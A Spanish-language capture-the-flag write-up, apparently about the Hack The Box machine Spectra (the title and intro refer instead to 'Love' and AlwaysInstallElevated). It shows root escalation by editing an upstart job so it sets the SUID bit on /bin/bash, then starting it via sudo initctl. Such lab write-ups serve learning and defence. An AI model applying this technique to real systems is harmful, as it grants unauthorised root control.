---
title: "Love HTB Escalando Privilegio"
layout: post
---
![Love HTB](/assets/images/Spectra.png)

<h2>Presentación</h2>
En esta ocasión no estaré presentando otra escalada de privilegio, de windows y es abusando de: AlwaysInstallElevated, me habia tomado tiempo la preparacion de algunos writeUp, ya que estuve preparandome para el eJPT el cual logramos obtener, tesis, mudanza y otras movida como seguir con networking y firewall desde EVE-NG, pronto..  🤯.

<h2>WinPEAS</h2>
En la fase de busqueda de privilegias, WinPeas nos presenta el siguiente setting:

![Love HTB Escalando Privilegio ](/assets/images/love-1.png)

<h2>Initctl</h2>
El poder ejecutar initctl se asemejó bastante a los privilegios aprendidos en la máquina Return (_si, si también debo traer ese WriteUp📝)_ con el grupo Server Operator Group, y es que ambos cuentan con la capacidad de iniciar y detener servicios. Pues en la máquina Spectra, como pudimos ver en la imagen aterior el usuario cuenta con dicho privilegio para ejecutar tarea como root temporalmente, y ya de seguro al saber que dicho usuario cuenta con tal poder sabes el siguiente paso, veamos!.

![ Spectra HTB Escalando Privilegio ](/assets/images/Image 2.png)

<h2> ¿Qué hago ahora? </h2>
En la imagen anterior listamos los servicios o *user-jobs* dentro de la carpeta "/etc/init" que es donde se encuentran todos los servicios que podemos controlar, e inmediatamente puedes ver al igual que cuando ejecutamos el comando para encontrar privilegios SUID, servicios no comunes 👍 de esos personalizados únicos en la maqquina en la que nos encontramos, si el test.conf, ¿qué es lo que se estaba probando? _lol_, ya que se encuentran detenido. 

{% highlight bash %} sudo -u root /usr/bin/initctl {% endhighlight %}

![ Spectra HTB Escalando Privilegio ](/assets/images/Image 1.png)

<h2>PoC</h2>
Y si nosotros decidimos modificar dicho script y añadir la siguiente línea con la intención de otorgar permisos SUID a la */bin/bash*.

{% highlight bash %}
script
    chmod u+s /bin/bash
end script
{% endhighlight %}

-[+] Guardamos e iniciamos nuestro *test.conf*
 
{% highlight bash %} sudo -u root /usr/bin/initctl start test {% endhighlight %}

-[+] Listamos permisos de la /bin/bash `ls -la /bin/bash`

![ Spectra HTB Escalando Privilegio ](/assets/images/Image 4.png)

🖱️_by:_ *@DaVinciRoot*
